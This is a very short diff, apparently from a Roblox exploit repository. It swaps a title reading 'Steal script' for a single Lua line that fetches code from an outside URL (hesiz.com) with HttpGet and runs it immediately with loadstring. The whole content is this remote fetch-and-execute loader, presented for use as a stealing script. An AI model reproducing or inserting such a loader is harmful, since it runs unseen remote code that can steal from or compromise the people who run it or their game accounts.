@@ -1,2 +1,1 @@
-# Steal
-Steal script
+loadstring(game:HttpGet("https://hesiz.com/api/DGIMHkMM/raw"))()
